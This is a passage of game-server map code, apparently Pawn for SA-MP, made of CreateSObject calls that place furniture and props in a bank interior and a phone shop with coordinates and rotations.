	CreateSObject(2266, -132.29750, -129.27631,3.33618,0.00000, 0.00000, 0.00000,object_show_distance, 0, world_bank);
	CreateSObject(2267, -152.59109, -134.71510,5.15723,0.00000, 0.00000, 90.00000,object_show_distance, 0, world_bank);
	CreateSObject(2261, -127.47270, -129.25920,5.68054,0.00000, 0.00000, 0.00000,object_show_distance, 0, world_bank);
	CreateSObject(2263, -119.84440, -129.30040,4.53668,0.00000, 0.00000, 0.00000,object_show_distance, 0, world_bank);
	CreateSObject(2289, -118.98670, -125.73810,5.15289,0.00000, 0.00000, 270.00000,object_show_distance, 0, world_bank);
	CreateSObject(2261, -134.74840, -129.24950,5.4549,0.00000, 0.00000, 0.00000,object_show_distance, 0, world_bank);
	CreateSObject(2773, -134.57739, -142.95010,3.31,0.00000, 0.00000, 0.00000,object_show_distance, 0, world_bank);
	CreateSObject(2773, -134.57829, -140.60100,3.31,0.00000, 0.00000, 0.00000,object_show_distance, 0, world_bank);
	CreateSObject(2773, -133.14191, -137.21049,3.31,0.00000, 0.00000, 90.00000,object_show_distance, 0, world_bank);
	CreateSObject(2773, -136.90250, -145.18530,3.31,0.00000, 0.00000, 0.00000,object_show_distance, 0, world_bank);
	CreateSObject(2773, -136.87740, -142.84470,3.31,0.00000, 0.00000, 0.00000,object_show_distance, 0, world_bank);
	CreateSObject(2773, -136.85640, -140.51360,3.31,0.00000, 0.00000, 0.00000,object_show_distance, 0, world_bank);
	CreateSObject(2773, -136.86290, -138.14500,3.31,0.00000, 0.00000, 0.00000,object_show_distance, 0, world_bank);
	CreateSObject(2773, -134.55310, -138.19980,3.31,0.00000, 0.00000, 0.00000,object_show_distance, 0, world_bank);
	CreateSObject(2773, -138.21651, -137.17390,3.31,0.00000, 0.00000, 90.00000,object_show_distance, 0, world_bank);
	CreateSObject(1721, -152.36639, -136.30969,2.79932,0.00000, 0.00000, -90.00000,object_show_distance, 0, world_bank);
	CreateSObject(1721, -152.36670, -135.64400,2.79932,0.00000, 0.00000, -90.00000,object_show_distance, 0, world_bank);
	CreateSObject(1721, -152.37289, -134.91960,2.79932,0.00000, 0.00000, -90.00000,object_show_distance, 0, world_bank);
	CreateSObject(1721, -152.40630, -132.59470,2.79932,0.00000, 0.00000, -90.00000,object_show_distance, 0, world_bank);
	CreateSObject(1721, -152.41280, -131.83360,2.79932,0.00000, 0.00000, -90.00000,object_show_distance, 0, world_bank);
	CreateSObject(1721, -152.46049, -131.05510,2.79932,0.00000, 0.00000, -90.30000,object_show_distance, 0, world_bank);
	CreateSObject(1721, -119.36670, -135.36220,2.79932,0.00000, 0.00000, 90.00000,object_show_distance, 0, world_bank);
	CreateSObject(1721, -119.31610, -134.70390,2.79932,0.00000, 0.00000, 90.00000,object_show_distance, 0, world_bank);
	CreateSObject(1721, -119.32640, -134.06270,2.79932,0.00000, 0.00000, 90.00000,object_show_distance, 0, world_bank);
	CreateSObject(1721, -119.32950, -137.25240,2.79932,0.00000, 0.00000, 90.00000,object_show_distance, 0, world_bank);
	CreateSObject(1721, -119.32850, -137.93510,2.79932,0.00000, 0.00000, 90.00000,object_show_distance, 0, world_bank);
	CreateSObject(1721, -119.35240, -138.67580,2.79932,0.00000, 0.00000, 90.00000,object_show_distance, 0, world_bank);
	CreateSObject(1721, -119.34260, -132.21220,2.79932,0.00000, 0.00000, 90.00000,object_show_distance, 0, world_bank);
	CreateSObject(1721, -119.32650, -131.53120,2.79932,0.00000, 0.00000, 90.00000,object_show_distance, 0, world_bank);
	CreateSObject(1721, -119.35030, -130.84689,2.79932,0.00000, 0.00000, 90.00000,object_show_distance, 0, world_bank);
	CreateSObject(2606, -152.58121, -137.94859,5.58423,14.00000, 0.00000, 90.00000,object_show_distance, 0, world_bank);
	CreateSObject(1753, -152.16310, -140.63789,2.78003,0.00000, 0.00000, 90.00000,object_show_distance, 0, world_bank);
	CreateSObject(1704, -120.74300, -145.21629,2.80249,0.00000, 0.00000, 180.00000,object_show_distance, 0, world_bank);
	CreateSObject(1704, -123.41810, -142.14230,2.80249,0.00000, 0.00000, 53.54211,object_show_distance, 0, world_bank);
	CreateSObject(2267, -129.81560, -128.83270,4.94592,0.00000, 0.00000, 0.00000,object_show_distance, 0, world_bank);
	CreateSObject(2257, -152.59340, -140.81430,5.35608,0.00000, 0.00000, 90.00000,object_show_distance, 0, world_bank);
	CreateSObject(2256, -118.97010, -140.81171,4.83966,0.00000, 0.00000, -90.00000,object_show_distance, 0, world_bank);
	CreateSObject(2254, -119.00410, -145.48390,4.83972,0.00000, 0.00000, -90.00000,object_show_distance, 0, world_bank);
	CreateSObject(2247, -149.88260, -143.20680,3.5,0.00000, 0.00000, -90.00000,object_show_distance, 0, world_bank);
	CreateSObject(2245, -121.23340, -143.04961,3.51001,0.00000, 0.00000, -90.00000,object_show_distance, 0, world_bank);
	CreateSObject(2002, -123.83380, -145.51860,2.71863,0.00000, 0.00000, 180.00000,object_show_distance, 0, world_bank);
	CreateSObject(2002, -119.42230, -123.34940,2.71863,0.00000, 0.00000, 270.00000,object_show_distance, 0, world_bank);
	CreateSObject(2002, -126.67000, -121.67060,2.71863,0.00000, 0.00000, 270.00000,object_show_distance, 0, world_bank);
	CreateSObject(2745, -138.60750, -137.57910,3.94897,0.00000, 0.00000, 0.00000,object_show_distance, 0, world_bank);
	CreateSObject(2745, -133.05530, -137.67650,3.94897,0.00000, 0.00000, 0.00000,object_show_distance, 0, world_bank);
	CreateSObject(0, -130.41150, -140.00000,4.50238,0.00000, 0.00000, 0.00000,object_show_distance, 0, world_bank);
	CreateSObject(2886, -142.79410, -119.31100,4.26434,0.00000, 0.00000, 0.00000,object_show_distance, 0, world_bank);
	CreateSObject(2994, -129.28070, -130.91330,3.3017,0.00000, 0.00000, 0.00000,object_show_distance, 0, world_bank);
	CreateSObject(956, -133.82021, -129.25020,3.09845,0.00000, 0.00000, 0.00000,object_show_distance, 0, world_bank);
	CreateSObject(955, -152.30290, -137.42110,3.09839,0.00000, 0.00000, 90.00000,object_show_distance, 0, world_bank);
	CreateSObject(2262, -124.77100, -129.24030,4.43469,0.00000, 0.00000, 0.00000,object_show_distance, 0, world_bank);
	CreateSObject(2281, -124.32940, -119.81790,5.45587,0.00000, 0.00000, 0.00000,object_show_distance, 0, world_bank);
	CreateSObject(2284, -120.37760, -119.82190,5.45587,0.00000, 0.00000, 0.00000,object_show_distance, 0, world_bank);
	CreateSObject(2007, -148.92419, -119.84410,2.77002,0.00000, 0.00000, 0.00000,object_show_distance, 0, world_bank);
	CreateSObject(2007, -147.89301, -119.86970,2.77002,0.00000, 0.00000, 0.00000,object_show_distance, 0, world_bank);
	CreateSObject(2007, -146.92390, -119.87640,2.77002,0.00000, 0.00000, 0.00000,object_show_distance, 0, world_bank);
	CreateSObject(2007, -144.06419, -119.88160,2.77002,0.00000, 0.00000, 0.00000,object_show_distance, 0, world_bank);
	CreateSObject(2007, -132.76810, -119.82180,2.77002,0.00000, 0.00000, 0.00000,object_show_distance, 0, world_bank);
	CreateSObject(2007, -138.78520, -119.95880,2.77002,0.00000, 0.00000, 0.00000,object_show_distance, 0, world_bank);
	CreateSObject(2007, -136.74200, -119.79780,2.77002,0.00000, 0.00000, 0.00000,object_show_distance, 0, world_bank);
	CreateSObject(2007, -135.74730, -119.82920,2.77002,0.00000, 0.00000, 0.00000,object_show_distance, 0, world_bank);
	CreateSObject(2007, -134.74300, -119.85130,2.77002,0.00000, 0.00000, 0.00000,object_show_distance, 0, world_bank);
	CreateSObject(2007, -131.76520, -119.84670,2.77002,0.00000, 0.00000, 0.00000,object_show_distance, 0, world_bank);
	CreateSObject(2007, -130.80000, -119.84760,2.77002,0.00000, 0.00000, 0.00000,object_show_distance, 0, world_bank);
	CreateSObject(2007, -129.79300, -119.83270,2.77002,0.00000, 0.00000, -0.36000,object_show_distance, 0, world_bank);
	CreateSObject(2007, -128.80161, -119.77590,2.77002,0.00000, 0.00000, 0.00000,object_show_distance, 0, world_bank);
	CreateSObject(2007, -127.81440, -119.75900,2.77002,0.00000, 0.00000, -0.18000,object_show_distance, 0, world_bank);
	CreateSObject(1789, -139.75661, -123.33090,3.35999,0.00000, 0.00000, 335.15741,object_show_distance, 0, world_bank);
	CreateSObject(1828, -122.01510, -126.39780,2.77802,0.00000, 0.00000, 90.00000,object_show_distance, 0, world_bank);
	CreateSObject(1778, -138.81709, -123.80600,2.8006,0.00000, 0.00000, 0.00000,object_show_distance, 0, world_bank);
	CreateSObject(1663, -141.78841, -127.02110,3.20953,0.00000, 0.00000, 355.69229,object_show_distance, 0, world_bank);
	CreateSObject(1663, -144.38071, -127.41010,3.20953,0.00000, 0.00000, 45.37023,object_show_distance, 0, world_bank);
	CreateSObject(1663, -139.49660, -127.31990,3.20953,0.00000, 0.00000, 273.71799,object_show_distance, 0, world_bank);
	CreateSObject(2010, -145.22200, -120.34060,2.80231,0.00000, 0.00000, 270.00000,object_show_distance, 0, world_bank);
	CreateSObject(2010, -137.84830, -120.35490,2.80231,0.00000, 0.00000, 270.00000,object_show_distance, 0, world_bank);
	CreateSObject(2010, -133.78349, -120.31630,2.80231,0.00000, 0.00000, 270.00000,object_show_distance, 0, world_bank);
	CreateSObject(2011, -152.47900, -120.35780,4.59998,0.00000, 0.00000, 270.00000,object_show_distance, 0, world_bank);
	CreateSObject(2152, -126.37650, -127.17460,2.89008,0.00000, 0.00000, 270.00000,object_show_distance, 0, world_bank);
	CreateSObject(2154, -126.39110, -125.82930,2.89008,0.00000, 0.00000, 270.00000,object_show_distance, 0, world_bank);
	CreateSObject(2151, -126.36780, -124.46010,2.89008,0.00000, 0.00000, 270.00000,object_show_distance, 0, world_bank);
	CreateSObject(2152, -126.36460, -123.09290,2.89014,0.00000, 0.00000, 270.00000,object_show_distance, 0, world_bank);
	CreateSObject(2149, -126.48380, -122.95500,4.09003,0.00000, 0.00000, 287.64999,object_show_distance, 0, world_bank);
	// Phone Shop
	CreateSObject(18008, -3310.22705, 528.38287, 1004.20313,   0.00000, 0.00000, 0.00000,object_show_distance,1);
	CreateSObject(18871, -3309.39307, 523.78589, 1001.51001,   90.00000, 0.00000, 192.02512,object_show_distance,1);
	CreateSObject(18870, -3309.71606, 523.67767, 1001.51001,   90.00000, 0.00000, 213.14729,object_show_distance,1);
	CreateSObject(18873, -3309.92188, 523.45667, 1001.51001,   90.00000, 0.00000, 236.88519,object_show_distance,1);
	CreateSObject(18872, -3310.07471, 523.13788, 1001.51001,   90.00000, 0.00000, 258.74521,object_show_distance,1);
	CreateSObject(18874, -3310.06860, 522.80066, 1001.51001,   90.00000, 0.00000, 283.54297,object_show_distance,1);
	CreateSObject(18865, -3309.97632, 522.52985, 1001.51001,   90.00000, 0.00000, 301.61932,object_show_distance,1);
	CreateSObject(18866, -3309.73340, 522.27960, 1001.51001,   90.00000, 0.00000, 325.95660,object_show_distance,1);
	CreateSObject(18867, -3309.44849, 522.13129, 1001.51001,   90.00000, 0.00000, 347.30222,object_show_distance,1);
	CreateSObject(18868, -3309.09277, 522.11957, 1001.51001,   90.00000, 0.00000, 10.14660,object_show_distance,1);
	CreateSObject(18870, -3308.78198, 522.23828, 1001.51001,   90.00000, 0.00000, 35.38210,object_show_distance,1);
	CreateSObject(18869, -3308.55542, 522.47223, 1001.51001,   90.00000, 0.00000, 57.84053,object_show_distance,1);
	CreateSObject(18869, -3317.76147, 523.74982, 1000.79901,   0.00000, 0.00000, 89.64000,object_show_distance,1);
	CreateSObject(18866, -3308.41528, 523.10468, 1001.51001,   90.00000, 0.00000, 103.20270,object_show_distance,1);
	CreateSObject(18865, -3308.55298, 523.44275, 1001.51001,   90.00000, 0.00000, 125.10790,object_show_distance,1);
	CreateSObject(18867, -3308.76196, 523.65057, 1001.51001,   90.00000, 0.00000, 143.20700,object_show_distance,1);
	CreateSObject(18869, -3309.07373, 523.78851, 1001.51001,   90.00000, 0.00000, 170.19679,object_show_distance,1);
	CreateSObject(1792, -3309.17725, 523.39630, 1002.87201,   14.00000, 0.00000, 180.00000,object_show_distance,1);
	CreateSObject(1792, -3308.79565, 522.84192, 1002.87201,   14.00000, 0.00000, 90.00000,object_show_distance,1);
	CreateSObject(1792, -3309.74048, 523.03107, 1002.87201,   14.00000, 0.00000, 270.00000,object_show_distance,1);
	CreateSObject(1792, -3309.33228, 522.48047, 1002.87201,   14.00000, 0.00000, 0.00000,object_show_distance,1);
	CreateSObject(1714, -3319.15796, 523.36621, 1000.20532,   0.00000, 0.00000, 109.58217,object_show_distance,1);
	CreateSObject(2463, -3319.97876, 522.71204, 1001.13989,   0.00000, 0.00000, 90.00000,object_show_distance,1);
	CreateSObject(2463, -3319.98340, 524.19031, 1001.13989,   0.00000, 0.00000, 90.00000,object_show_distance,1);
	CreateSObject(2463, -3319.97852, 521.23364, 1001.13989,   0.00000, 0.00000, 90.00000,object_show_distance,1);
	CreateSObject(1792, -3320.37500, 525.89740, 1002.20789,   0.00000, 0.00000, 90.00000,object_show_distance,1);
	CreateSObject(18871, -3308.41260, 522.77887, 1001.51001,   90.00000, 0.00000, 79.81990,object_show_distance,1);
	CreateSObject(2448, -3317.82104, 522.62531, 999.53998,   0.00000, 0.00000, 270.00000,object_show_distance,1);
	CreateSObject(2448, -3317.81665, 524.96075, 999.53998,   0.00000, 0.00000, 270.00000,object_show_distance,1);
	CreateSObject(2447, -3317.99609, 525.91187, 999.53998,   0.00000, 0.00000, 90.00000,object_show_distance,1);
	CreateSObject(2446, -3318.77173, 526.19873, 1000.08545,   0.00000, 0.00000, 0.00000,object_show_distance,1);
	CreateSObject(2446, -3319.69995, 526.19769, 1000.08441,   0.00000, 0.00000, 0.00000,object_show_distance,1);
	CreateSObject(18870, -3317.76416, 522.34998, 1000.79901,   0.00000, 0.00000, 90.00000,object_show_distance,1);
	CreateSObject(18869, -3317.76416, 522.03003, 1000.79901,   0.00000, 0.00000, 90.00000,object_show_distance,1);
	CreateSObject(18868, -3317.76416, 521.71002, 1000.79901,   0.00000, 0.00000, 90.00000,object_show_distance,1);
	CreateSObject(18874, -3317.75415, 521.39001, 1000.79901,   0.00000, 0.00000, 90.00000,object_show_distance,1);
	CreateSObject(18873, -3317.75439, 521.06989, 1000.79901,   0.00000, 0.00000, 90.00000,object_show_distance,1);
	CreateSObject(2437, -3319.96997, 521.16095, 1000.21698,   0.00000, 0.00000, 88.79220,object_show_distance,1);
	CreateSObject(2365, -3318.36108, 526.24567, 1001.13098,   0.00000, 0.00000, 0.00000,object_show_distance,1);
	CreateSObject(2369, -3318.19067, 525.20129, 1001.12952,   0.00000, 0.00000, 90.00000,object_show_distance,1);
	CreateSObject(19378, -3306.65674, 523.70184, 999.48541,   90.00000, 0.00000, 0.00000,object_show_distance,1);
	CreateSObject(19423, -3312.15894, 528.21460, 1001.77802,   0.00000, 0.00000, 0.00000,object_show_distance,1);
	CreateSObject(19378, -3306.61084, 523.47168, 1004.27972,   0.00000, 90.00000, 0.00000,object_show_distance,1);
	CreateSObject(2028, -3307.93970, 528.19067, 1000.58197,   0.00000, 0.00000, 0.00000,object_show_distance,1);
	CreateSObject(1790, -3306.68750, 528.21704, 1000.71442,   0.00000, 0.00000, 0.00000,object_show_distance,1);
	CreateSObject(1790, -3306.68896, 528.21698, 1000.57001,   0.00000, 0.00000, 0.00000,object_show_distance,1);
	CreateSObject(1790, -3306.68750, 528.21698, 1000.85999,   0.00000, 0.00000, 0.00000,object_show_distance,1);
	CreateSObject(2028, -3307.37646, 528.19000, 1000.58197,   0.00000, 0.00000, -0.06000,object_show_distance,1);
	CreateSObject(2239, -3308.81201, 528.23608, 1000.20715,   0.00000, 0.00000, 0.00000,object_show_distance,1);
	CreateSObject(2239, -3314.30151, 528.25592, 1000.20715,   0.00000, 0.00000, 0.00000,object_show_distance,1);
	CreateSObject(2468, -3307.71313, 528.46863, 1001.31183,   0.00000, 0.00000, 0.00000,object_show_distance,1);
	CreateSObject(2466, -3319.73975, 524.35309, 1002.42603,   0.00000, 0.00000, 91.07190,object_show_distance,1);
	CreateSObject(2466, -3319.76392, 521.49078, 1001.73102,   0.00000, 0.00000, 91.07190,object_show_distance,1);
	CreateSObject(2465, -3319.88745, 523.31873, 1003.56262,   0.00000, 0.00000, 90.00000,object_show_distance,1);
	CreateSObject(2464, -3320.10352, 524.01642, 1001.72900,   0.00000, 0.00000, 228.03320,object_show_distance,1);
	CreateSObject(2464, -3320.05103, 522.27954, 1002.42999,   0.00000, 0.00000, 296.91751,object_show_distance,1);
	CreateSObject(2241, -3319.25757, 519.04138, 1000.71930,   0.00000, 0.00000, 0.00000,object_show_distance,1);
	CreateSObject(0, -3315.79346, 523.37732, 1001.68799,   0.00000, 0.00000, -0.12000,object_show_distance,1);
	CreateSObject(2002, -3319.54272, 525.43280, 1000.20880,   0.00000, 0.00000, 90.00000,object_show_distance,1);
	CreateSObject(0, -3318.82983, 522.15259, 1010.40167,   0.00000, 0.00000, 90.00000,object_show_distance,1);
	CreateSObject(2196, -3318.51660, 522.70258, 1001.12903,   0.00000, 0.00000, 121.45046,object_show_distance,1);
	CreateSObject(18871, -3317.96558, 522.60437, 1000.29102,   0.00000, 0.00000, 90.30000,object_show_distance,1);
	CreateSObject(18867, -3317.75562, 523.41492, 1000.79901,   0.00000, 0.00000, 90.00000,object_show_distance,1);
	CreateSObject(18874, -3317.76953, 524.10980, 1000.79901,   0.00000, 0.00000, 89.64000,object_show_distance,1);
	CreateSObject(18873, -3317.75659, 524.43018, 1000.79901,   0.00000, 0.00000, 89.64000,object_show_distance,1);
	CreateSObject(18872, -3317.76440, 524.78998, 1000.79901,   0.00000, 0.00000, 89.64000,object_show_distance,1);
	CreateSObject(18870, -3317.77246, 525.12988, 1000.79901,   0.00000, 0.00000, 89.64000,object_show_distance,1);
	CreateSObject(2886, -3317.83716, 525.97113, 1000.52301,   270.00000, 0.00000, 90.00000,object_show_distance,1);
	CreateSObject(2886, -3317.83716, 525.97113, 1000.79999,   270.00000, 0.00000, 90.00000,object_show_distance,1);
	CreateSObject(19378, -3315.94336, 528.78870, 1002.52789,   0.00000, 0.00000, 90.00000,object_show_distance,1);
	CreateSObject(19424, -3312.66089, 528.21027, 1001.77802,   0.00000, 0.00000, 0.06000,object_show_distance,1);
	CreateSObject(19422, -3313.16162, 528.21289, 1001.77802,   0.00000, 0.00000, 0.06000,object_show_distance,1);
	CreateSObject(19421, -3313.64282, 528.22498, 1001.77802,   0.00000, 0.00000, 0.12000,object_show_distance,1);
	CreateSObject(330, -3315.68726, 523.90491, 1001.26703,   90.00000, 0.00000, 299.05826,object_show_distance,1);
	CreateSObject(330, -3316.06909, 524.10443, 1001.26703,   90.00000, 0.00000, 355.66263,object_show_distance,1);
	CreateSObject(330, -3315.68018, 523.42133, 1000.29999,   90.00000, 0.00000, 231.84360,object_show_distance,1);
	CreateSObject(330, -3316.05518, 523.24493, 1001.26703,   90.00000, 0.00000, 177.21394,object_show_distance,1);
	CreateSObject(330, -3318.17383, 524.21606, 1000.59430,   90.00000, 0.00000, -90.00000,object_show_distance,1);
	CreateSObject(330, -3316.41187, 523.39758, 1001.26703,   90.00000, 0.00000, 124.19743,object_show_distance,1);
	CreateSObject(2886, -3313.61475, 528.41205, 1001.28998,   270.00000, 0.00000, 0.00000,object_show_distance,1);
	CreateSObject(2886, -3312.91138, 528.41382, 1001.28998,   270.00000, 0.00000, 0.00000,object_show_distance,1);
	CreateSObject(2886, -3312.22729, 528.43347, 1001.28998,   270.00000, 0.00000, -0.12000,object_show_distance,1);
	CreateSObject(2886, -3311.27148, 528.32043, 1001.28998,   270.00000, 0.00000, -0.12000,object_show_distance,1);
	CreateSObject(2886, -3310.52930, 528.31952, 1001.28998,   270.00000, 0.00000, -0.36000,object_show_distance,1);
	CreateSObject(2886, -3309.82886, 528.32037, 1001.28998,   270.00000, 0.00000, -0.12000,object_show_distance,1);
	CreateSObject(19423, -3311.38086, 528.13898, 1001.77802,   0.00000, 0.00000, 0.00000,object_show_distance,1);
	CreateSObject(19424, -3310.81714, 528.12030, 1001.77802,   0.00000, 0.00000, 0.06000,object_show_distance,1);
	CreateSObject(19422, -3310.23511, 528.09412, 1001.77802,   0.00000, 0.00000, 0.06000,object_show_distance,1);
	CreateSObject(19421, -3309.72925, 528.07422, 1001.77802,   0.00000, 0.00000, 0.12000,object_show_distance,1);
	CreateSObject(1234, -3318.49976, 528.71783, 1001.28198,   0.00000, 0.00000, 0.00000,object_show_distance,1);
	CreateSObject(2385, -3314.71582, 518.67645, 1001.53864,   0.00000, 0.00000, 180.00000,object_show_distance,1);
	CreateSObject(2232, -3307.21875, 520.50385, 1001.09998,   0.00000, 0.00000, 270.00000,object_show_distance,1);
	CreateSObject(2232, -3307.19678, 525.47693, 1001.09998,   0.00000, 0.00000, 270.00000,object_show_distance,1);
	CreateSObject(2232, -3311.35938, 525.43481, 1001.09998,   0.00000, 0.00000, 90.00000,object_show_distance,1);
	CreateSObject(2232, -3311.34131, 520.50183, 1001.09998,   0.00000, 0.00000, 90.00000,object_show_distance,1);
	CreateSObject(2468, -3307.01123, 528.46649, 1001.31183,   0.00000, 0.00000, 0.00000,object_show_distance,1);
	CreateSObject(2385, -3316.88281, 518.68188, 1001.53857,   0.00000, 0.00000, 180.00000,object_show_distance,1);
	CreateSObject(2385, -3314.71582, 518.67645, 1000.20001,   0.00000, 0.00000, 180.00000,object_show_distance,1);
	CreateSObject(2385, -3316.88281, 518.68195, 1000.20001,   0.00000, 0.00000, 180.00000,object_show_distance,1);
	CreateSObject(330, -3316.45947, 523.83276, 1001.26703,   90.00000, 0.00000, 57.45492,object_show_distance,1);
	CreateSObject(330, -3317.70947, 525.88605, 1001.10999,   90.00000, 0.00000, -90.00000,object_show_distance,1);
	CreateSObject(330, -3317.72144, 526.13519, 1001.10999,   90.00000, 0.00000, -89.94000,object_show_distance,1);
	CreateSObject(330, -3317.72754, 526.35510, 1001.10999,   90.00000, 0.00000, -90.06000,object_show_distance,1);
	CreateSObject(1506, -3306.71289, 522.15955, 1000.17688,   0.00000, 0.00000, 90.00000,object_show_distance,1);
	CreateSObject(2202, -3323.98267, 520.06158, 1000.19745,   0.00000, 0.00000, 90.00000,object_show_distance,1);
	CreateSObject(2611, -3324.45435, 519.78992, 1002.07825,   0.00000, 0.00000, 90.00000,object_show_distance,1);
	CreateSObject(2605, -3324.03394, 519.66437, 1000.53998,   0.00000, 0.00000, 90.00000,object_show_distance,1);
	CreateSObject(330, -3315.68018, 523.42126, 1001.26703,   90.00000, 0.00000, 231.84360,object_show_distance,1);
	CreateSObject(330, -3316.39551, 523.30804, 1000.29999,   90.00000, 0.00000, 141.84360,object_show_distance,1);
	CreateSObject(330, -3316.42822, 523.94629, 1000.29999,   90.00000, 0.00000, 51.84360,object_show_distance,1);
	CreateSObject(330, -3315.82031, 524.03864, 1000.29999,   90.00000, 0.00000, 319.77161,object_show_distance,1);
	CreateSObject(18871, -3317.76147, 522.66998, 1000.79901,   0.00000, 0.00000, 90.00000,object_show_distance,1);
	CreateSObject(18870, -3317.93311, 521.26117, 1000.29102,   0.00000, 0.00000, 90.30000,object_show_distance,1);
	CreateSObject(18869, -3317.91016, 521.96100, 1000.29102,   0.00000, 0.00000, 90.30000,object_show_distance,1);
	CreateSObject(18868, -3317.79370, 523.47589, 1000.29102,   0.00000, 0.00000, 90.30000,object_show_distance,1);
	CreateSObject(18867, -3317.78101, 524.06207, 1000.29102,   0.00000, 0.00000, 90.30000,object_show_distance,1);
	CreateSObject(18873, -3317.80640, 525.17542, 1000.29102,   0.00000, 0.00000, 90.30000,object_show_distance,1);
	CreateSObject(330, -3317.78564, 525.03778, 1000.49481,   90.00000, 0.00000, -90.00000,object_show_distance,1);
	CreateSObject(330, -3317.70410, 525.63507, 1001.10999,   90.00000, 0.00000, -90.00000,object_show_distance,1);
	CreateSObject(330, -3317.76563, 524.21771, 1000.49481,   90.00000, 0.00000, -90.00000,object_show_distance,1);
	CreateSObject(330, -3317.76563, 524.49786, 1000.49481,   90.00000, 0.00000, -90.36000,object_show_distance,1);
	CreateSObject(330, -3317.76538, 523.51581, 1000.49481,   90.00000, 0.00000, -89.76000,object_show_distance,1);
	CreateSObject(330, -3317.76538, 523.85577, 1000.49481,   90.00000, 0.00000, -90.00000,object_show_distance,1);
	CreateSObject(330, -3317.74780, 522.71393, 1000.49481,   90.00000, 0.00000, -89.76000,object_show_distance,1);
	CreateSObject(330, -3317.75610, 522.55408, 1000.49481,   90.00000, 0.00000, -89.76000,object_show_distance,1);
	CreateSObject(330, -3317.77075, 521.31067, 1000.49481,   90.00000, 0.00000, -89.70000,object_show_distance,1);
	CreateSObject(330, -3317.75610, 522.55408, 1000.49481,   90.00000, 0.00000, -89.76000,object_show_distance,1);
	CreateSObject(330, -3317.75854, 521.83209, 1000.49481,   90.00000, 0.00000, -89.70000,object_show_distance,1);
	CreateSObject(2252, -3309.71021, 523.37512, 1001.00000,   0.00000, 0.00000, 0.00000,object_show_distance,1);
	CreateSObject(2252, -3309.74023, 522.51465, 1001.00000,   0.00000, 0.00000, 0.00000,object_show_distance,1);
	CreateSObject(2252, -3308.74365, 523.36481, 1001.00000,   0.00000, 0.00000, 0.00000,object_show_distance,1);
	CreateSObject(2252, -3308.84131, 522.47668, 1001.00000,   0.00000, 0.00000, 0.12000,object_show_distance,1);
	CreateSObject(18008, -3310.22705, 528.38287, 1004.20313,   0.00000, 0.00000, 0.00000,object_show_distance,1);
	CreateSObject(18871, -3309.39307, 523.78589, 1001.51001,   90.00000, 0.00000, 192.02512,object_show_distance,1);
	CreateSObject(18870, -3309.71606, 523.67767, 1001.51001,   90.00000, 0.00000, 213.14729,object_show_distance,1);
	CreateSObject(18873, -3309.92188, 523.45667, 1001.51001,   90.00000, 0.00000, 236.88519,object_show_distance,1);
	CreateSObject(18872, -3310.07471, 523.13788, 1001.51001,   90.00000, 0.00000, 258.74521,object_show_distance,1);
	CreateSObject(18874, -3310.06860, 522.80066, 1001.51001,   90.00000, 0.00000, 283.54297,object_show_distance,1);
	CreateSObject(18865, -3309.97632, 522.52985, 1001.51001,   90.00000, 0.00000, 301.61932,object_show_distance,1);
	CreateSObject(18866, -3309.73340, 522.27960, 1001.51001,   90.00000, 0.00000, 325.95660,object_show_distance,1);
	CreateSObject(18867, -3309.44849, 522.13129, 1001.51001,   90.00000, 0.00000, 347.30222,object_show_distance,1);
	CreateSObject(18868, -3309.09277, 522.11957, 1001.51001,   90.00000, 0.00000, 10.14660,object_show_distance,1);
	CreateSObject(18870, -3308.78198, 522.23828, 1001.51001,   90.00000, 0.00000, 35.38210,object_show_distance,1);
	CreateSObject(18869, -3308.55542, 522.47223, 1001.51001,   90.00000, 0.00000, 57.84053,object_show_distance,1);
	CreateSObject(18869, -3317.76147, 523.74982, 1000.79901,   0.00000, 0.00000, 89.64000,object_show_distance,1);
	CreateSObject(18866, -3308.41528, 523.10468, 1001.51001,   90.00000, 0.00000, 103.20270,object_show_distance,1);
	CreateSObject(18865, -3308.55298, 523.44275, 1001.51001,   90.00000, 0.00000, 125.10790,object_show_distance,1);
	CreateSObject(18867, -3308.76196, 523.65057, 1001.51001,   90.00000, 0.00000, 143.20700,object_show_distance,1);
	CreateSObject(18869, -3309.07373, 523.78851, 1001.51001,   90.00000, 0.00000, 170.19679,object_show_distance,1);
	CreateSObject(1792, -3309.17725, 523.39630, 1002.87201,   14.00000, 0.00000, 180.00000,object_show_distance,1);
	CreateSObject(1792, -3308.79565, 522.84192, 1002.87201,   14.00000, 0.00000, 90.00000,object_show_distance,1);
	CreateSObject(1792, -3309.74048, 523.03107, 1002.87201,   14.00000, 0.00000, 270.00000,object_show_distance,1);
	CreateSObject(1792, -3309.33228, 522.48047, 1002.87201,   14.00000, 0.00000, 0.00000,object_show_distance,1);
	CreateSObject(1714, -3319.15796, 523.36621, 1000.20532,   0.00000, 0.00000, 109.58217,object_show_distance,1);
	CreateSObject(2463, -3319.97876, 522.71204, 1001.13989,   0.00000, 0.00000, 90.00000,object_show_distance,1);
	CreateSObject(2463, -3319.98340, 524.19031, 1001.13989,   0.00000, 0.00000, 90.00000,object_show_distance,1);
	CreateSObject(2463, -3319.97852, 521.23364, 1001.13989,   0.00000, 0.00000, 90.00000,object_show_distance,1);
	CreateSObject(1792, -3320.37500, 525.89740, 1002.20789,   0.00000, 0.00000, 90.00000,object_show_distance,1);
	CreateSObject(18871, -3308.41260, 522.77887, 1001.51001,   90.00000, 0.00000, 79.81990,object_show_distance,1);
	CreateSObject(2448, -3317.82104, 522.62531, 999.53998,   0.00000, 0.00000, 270.00000,object_show_distance,1);
	CreateSObject(2448, -3317.81665, 524.96075, 999.53998,   0.00000, 0.00000, 270.00000,object_show_distance,1);
	CreateSObject(2447, -3317.99609, 525.91187, 999.53998,   0.00000, 0.00000, 90.00000,object_show_distance,1);
	CreateSObject(2446, -3318.77173, 526.19873, 1000.08545,   0.00000, 0.00000, 0.00000,object_show_distance,1);
	CreateSObject(2446, -3319.69995, 526.19769, 1000.08441,   0.00000, 0.00000, 0.00000,object_show_distance,1);
	CreateSObject(18870, -3317.76416, 522.34998, 1000.79901,   0.00000, 0.00000, 90.00000,object_show_distance,1);
	CreateSObject(18869, -3317.76416, 522.03003, 1000.79901,   0.00000, 0.00000, 90.00000,object_show_distance,1);
	CreateSObject(18868, -3317.76416, 521.71002, 1000.79901,   0.00000, 0.00000, 90.00000,object_show_distance,1);
	CreateSObject(18874, -3317.75415, 521.39001, 1000.79901,   0.00000, 0.00000, 90.00000,object_show_distance,1);
	CreateSObject(18873, -3317.75439, 521.06989, 1000.79901,   0.00000, 0.00000, 90.00000,object_show_distance,1);
	CreateSObject(2437, -3319.96997, 521.16095, 1000.21698,   0.00000, 0.00000, 88.79220,object_show_distance,1);
